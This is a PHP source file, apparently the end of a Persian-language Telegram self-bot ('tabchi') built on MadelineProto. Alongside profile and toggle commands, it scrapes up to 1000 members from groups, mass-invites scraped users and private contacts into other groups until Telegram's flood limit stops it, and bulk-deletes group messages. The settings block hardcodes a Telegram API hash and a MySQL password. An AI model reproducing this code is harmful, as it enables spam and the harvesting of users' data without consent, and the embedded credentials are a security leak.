yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' =>'✅ چـت خـودکـار روشـن شـد','reply_to_msg_id' => $Message_id]);
} else {
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' =>'❌ چـت خـودکـار خـامـوش شـد','reply_to_msg_id' => $Message_id]);
}
}

# On Or Off Auto Send Number Bot
if (preg_match("/^[\/\#\!]?(AutoNumber) (on|off)$/i", $Message)){
preg_match("/^[\/\#\!]?(AutoNumber) (on|off)$/i", $Message, $m);
$data['number']['on'] = "$m[2]";
file_put_contents("data/data.json", json_encode($data));
if ($m[2] == 'on'){
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' =>'✅ ارسـال خـودکـار شـمـاره روشـن شـد','reply_to_msg_id' => $Message_id]);
} else {
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' =>'❌ ارسـال خـودکـار شـمـاره خـامـوش شـد','reply_to_msg_id' => $Message_id]);
}
}

# On Or Off Auto Save Number
if (preg_match("/^[\/\#\!]?(AutoSaveNumber) (on|off)$/i", $Message)){
preg_match("/^[\/\#\!]?(AutoSaveNumber) (on|off)$/i", $Message, $m);
$data['savenumber']['on'] = "$m[2]";
file_put_contents("data/data.json", json_encode($data));
if ($m[2] == 'on'){
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' =>'✅ ذخـیـره خـودکـار مـخـاطب روشـن شـد','reply_to_msg_id' => $Message_id]);
} else {
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' =>'❌ ذخـیـره خـودکـار مـخـاطـب خـامـوش شـد','reply_to_msg_id' => $Message_id]);
}
}

# On Or Off Auto Voice
if (preg_match("/^[\/\#\!]?(AutoVoice) (on|off)$/i", $Message)){
preg_match("/^[\/\#\!]?(AutoVoice) (on|off)$/i", $Message, $m);
$data['autovoice']['on'] = "$m[2]";
file_put_contents("data/data.json", json_encode($data));
if ($m[2] == 'on'){
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' =>'✅ ویـس خـودکـار روشـن شـد','reply_to_msg_id' => $Message_id]);
} else {
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' =>'❌ ویـس خـودکـار خـامـوش شـد','reply_to_msg_id' => $Message_id]);
}
}


# On Or Off Auto Gif
if (preg_match("/^[\/\#\!]?(AutoGif) (on|off)$/i", $Message)){
preg_match("/^[\/\#\!]?(AutoGif) (on|off)$/i", $Message, $m);
$data['autogif']['on'] = "$m[2]";
file_put_contents("data/data.json", json_encode($data));
if ($m[2] == 'on'){
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' =>'✅ گـیـف خـودکـار روشـن شـد','reply_to_msg_id' => $Message_id]);
} else {
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' =>'❌ گـیـف خـودکـار خـامـوش شـد','reply_to_msg_id' => $Message_id]);
}
}

# Set New id in Account
if(preg_match( "/^[\/\#\!]?(SetId) (.*)$/i", $Message, $text)){
$id = $text[ 2 ];
try {
$User = yield $this->account->updateUsername( [ 'username' => "$id" ] );
} catch ( Exception $v ) {
$this->messages->sendMessage( [ 'peer' => $Chat_ID, 'message' => '❗' . $v->getMessage() ] );
}
$this->messages->sendMessage( [
'peer' => $Chat_ID,
'message' => "⚙ تـنـظـیم شـد

🦠 یـوزرنـیـم جـدید :
@$id"
] );
}

# Set New Name in account
if (preg_match('/^!Setname (.*)/', $Message, $match)) {
yield $this->account->updateProfile(['first_name' => "$match[1]"]);
yield $this->messages->sendMessage( [ 'peer' => $Chat_ID, 'message' => "🎈 تـنـظـیم شـد

🔸نـام جـدیـد : $match[1]" ] );
}

# Add All Members Pv in Group
if(strpos($Message, '!Addall ') !== false){
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'reply_to_msg_id' => $Message_id , 'message' => '★ لـطـفـا کـمـی صـبـر کـنـیـد . . .']);
$gpid = explode('!Addall ', $Message)[1];
$dialogs = yield $this->get_dialogs();
foreach ($dialogs as $peer) {
$Types = yield $this->get_info($peer);
$Types3 = $Types['type'];
if($Types3 == 'user'){
$pvid = $Types['user_id'];
$this->channels->inviteToChannel(['channel' => $gpid, 'users' => [$pvid]]);
}
}
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'reply_to_msg_id' => $Message_id , 'message' => "» هـمـه کـاربـران پـیـوی بـه گـروه ادد شـدنـد",'parse_mode'=>"MarkDown"]);
}

# Del Groups
if(preg_match("/^[\/\#\!]?(Delgroups) (.*)$/i", $Message)){
preg_match("/^[\/\#\!]?(Delgroups) (.*)$/i", $Message, $text);
yield $this->messages->sendMessage(['peer' => $Chat_ID,'reply_to_msg_id' => $Message_id, 'message' =>'★ لـطـفـا کـمـی صـبـر کـنـیـد . . ..',
'reply_to_msg_id' => $Message_id]);
$count = 0;
$all = yield $this->get_dialogs();
foreach ($all as $peer) {
try {
$Types = yield $this->get_info($peer);
$Types3 = $Types['type'];
if($Types3 == 'supergroup' || $Types3 == 'chat'){
$id = $Types['bot_api_id'];
if($Chat_ID != $id){
yield $this->channels->leaveChannel(['channel' => $id]);
$count++;
if ($count == $text[2]) {
break;
}
}
}
} catch(Exception $m){}
}
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' => "» تـعـداد `$text[2]` گـروه بـا مـوفـقـیـت حـذف شـد",'reply_to_msg_id' => $Message_id,'parse_mode'=>"MarkDown"]);
}

# Add A User For All Group
if(preg_match("/^[#\!\/](Addall) (.*)$/", $Message)){
preg_match("/^[#\!\/](Addall) (.*)$/", $Message, $text1);
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' =>'★ لـطـفـا کـمـی صـبـر کـنـیـد . . ..',
'reply_to_msg_id' => $Message_id]);
$user = $text1[2];
$dialogs = yield $this->get_dialogs();
foreach ($dialogs as $peer) {
try {
$Types = yield $this->get_info($peer);
$Types3 = $Types['type'];
} catch(Exception $d){}
if($Types3 == 'supergroup'){
try {
yield $this->channels->inviteToChannel(['channel' => $peer, 'users' => ["$user"]]);
} catch(Exception $d){}
}
}
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'reply_to_msg_id' => $Message_id , 'message' => "√ کـاربـر $user بـه هـمـه گـروه هـا ادد شـد",
'parse_mode' => 'MarkDown']);
}

# Set Photo Reply in Profile Account
if(preg_match('/^!Setphoto$/i', $Message, $mch)){
if(isset($update['message']['reply_to'])){
if($update['message']['peer_id']['_'] == 'peerChannel')
$messeg = yield $this->channels->getMessages(['channel' => $update, 'id' => [$update['message']['reply_to']['reply_to_msg_id']]]);
else
$messeg = yield $this->messages->getMessages(['id' => [$update['message']['reply_to']['reply_to_msg_id']]]);
if(isset($messeg['messages'][0]['media']['photo'])){
yield $this->photos->updateProfilePhoto(['file' => $messeg['messages'][0]['media']]);
$text1 = "√ بـا مـوفـقـیـت در پـروفـایـل سـت شــد";
}else
$text1 = "× بـایـد بـه یـک عـکـس ریـپـلای کـنـیـد";
}else
$text1 = "× بـایـد بـه یـک عـکـس ریـپـلای کـنـیـد";
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' => $text1], ['FloodWaitLimit' => 0]);
}

# Left From Group
if(preg_match("/^[\/\#\!]?(خروج|Left)$/i", $Message)){
$Types = yield $this->getInfo($Chat_ID);
$Types3 = $Types['type'];
if($Types3 == "supergroup"){
yield $this->messages->sendMessage(['peer' => $Chat_ID,'message' => "☪ در حـال خـروج هـسـتم . . ."]);
yield $this->channels->leaveChannel(['channel' => $Chat_ID, ]);
}else{
yield $this->messages->sendMessage(['peer' => $Chat_ID,'reply_to_msg_id' => $Message_id ,'message' => "» این دستور فقط در سوپر گروه قابل اجرا است !"]);
}
}

# Save All Members A Group
elseif ($Message == "!Exports") {
if($Types == 'supergroup'){
unlink('data/member.json');
file_put_contents('data/member.json', '{"list":{}}');
yield $this->messages->sendMessage(['peer' => $Admins_Tabchi,'reply_to_msg_id' => $Message_id, 
'message' => "⛏ در حـال اسـتـخـراج اعـضـای گـروه . . ."]);
$chat = yield $this->getPwrChat($Chat_ID);
$i = 0;
foreach ($chat['participants'] as $pars) {
$id = $pars['user']['id'];
if (!in_array($id, $member['list'])) {
$member['list'][] = $id;
yield Amp\File\put('data/member.json', json_encode( $member ));
$i++;
}
if ($i == 1000) break;
}
yield $this->messages->sendMessage(['peer' => $Admins_Tabchi,'reply_to_msg_id' => $Message_id, 'message' => "⚙ تـعـداد $i مـمـبـر اسـتـخـراج شـد"]);
} else{
yield $this->messages->sendMessage(['peer' => $Chat_ID,'reply_to_msg_id' => $Message_id, 'reply_to_msg_id' => $Message_id , 'message' => '❗️ لـطـفـا در سـوپـر گـروه هـا بـفـرسـتـیـد']);
}
}

# Clean All Massage Group
if($Message == '!Delall' or $Message == 'پاکسازی گپ'){
if($Types == "supergroup"||$Types == "chat"){
yield $this->messages->sendMessage([
'peer' => $Chat_ID,
'reply_to_msg_id' => $Message_id,
'message'=> "✅", 
'parse_mode'=> 'markdown' ,
]);
$array = range($Message_id,1);
$chunk = array_chunk($array,600);
foreach($chunk as $v){
sleep(0.05);
yield $this->channels->deleteMessages([
'channel' =>$Chat_ID,
'id' =>$v
]);
}
}
else{
yield $this->messages->sendMessage(['peer' => $Chat_ID,'reply_to_msg_id' => $Message_id ,'message' => "❗ این دستور مخصوص استفاده در گروه ها میباشد"]);
}
}

# Add All Save Members With Links
if ( preg_match( '/^\/?(!Add) (.*)$/ui', $Message, $text1 ) ) {
if (preg_match( "/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/", $Message)){
yield $this->messages->sendMessage( [ 'peer' => $Chat_ID, 'message' => "» در حـال ادد اعـضـای اسـتخـراج شـده . . ." ] );
$gpid = $text1[ 2 ];
if ( !file_exists( "$gpid.json" ) ) {
file_put_contents( "$gpid.json", '{"list":{}}' );
}
@$addmember = json_decode( file_get_contents( "$gpid.json" ), true );
$c = 0;
$add = 0;
foreach ( $member[ 'list' ] as $id ) {
if ( !in_array( $id, $addmember[ 'list' ] ) ) {
$addmember[ 'list' ][] = $id;
file_put_contents( "$gpid.json", json_encode( $addmember ) );
$c++;
try {
yield $this->channels->inviteToChannel( [ 'channel' => $gpid, 'users' => [ "$id" ] ] );
$add++;
} catch ( danog\ MadelineProto\ RPCErrorException $e ) {
if ( $e->getMessage() == "PEER_FLOOD" ) {
yield $this->messages->sendMessage( [ 'peer' => $Chat_ID, 'message' => "⛔ محـدود شـده ایـد" ] );
break;
}
}
}
}
unlink( "$gpid.json" );
yield $this->messages->sendMessage( [ 'peer' => $Chat_ID, 'message' => "» تـعـداد $add عـضـو بـا مـوفـقـیـت بـه گـروه افـزوده شـد

» کـل تـلاش هـا : $c" ] );
}
else{
yield $this->messages->sendMessage( [ 'peer' => $Chat_ID, 'message' => "🚫 لـیـنـک اشـتـبـاه اسـت لـطـفـا چـک کـنـیـد" ] );
}
}

# Delete All Save Members
if ( preg_match( '/^\/?(!Deletemember)$/ui', $Message ) ) {
$member[ 'list' ] = [];
yield Amp\File\put('data/member.json', json_encode( $member ));
yield $this->messages->sendMessage( [ 'peer' => $Chat_ID, 'message' => "✅ اعـضـای اسـتـخـراج شـده حـذف شـدنـد" ] );
}
}
} catch (\Throwable $e){
$this->report("Surfaced: $e");
}
}
}
$settings = [
'serialization' => [
'cleanup_before_serialization' => true,
],
'logger' => [
'max_size' => 1*1024*1024,
],
'peer' => [
'full_fetch' => false,
'cache_all_peers_on_startup' => false,
],
'app_info' => [
'api_id' => 13472319,
'api_hash' => '803a5b7ee927d6af5b8f74c31d49ebdf'],
'db'=> [
'type'  => 'mysql',
'mysql' => [
'host' => 'localhost',
'port' => '3306',
'user' => 'matadorn_abchi',
'password' => 'hdyebejwoshsjw&#_€×&2',
'database' => 'matadorn_Tab_Zeus',
'max_connections' => '5',
]
]
];
// @Source_FranceiR | @SourceFranceBot
// @Source_FranceiR | @SourceFranceBot
// @Source_FranceIR | [🇫🇷]𝐎𝐬𝐜𝐚𝐫_𝐙𝐞𝐮𝐬™
$Zeus = new \danog\MadelineProto\API('Zeus.Madeline', $settings);
$Zeus->startAndLoop(ZeusHandler::class);
?>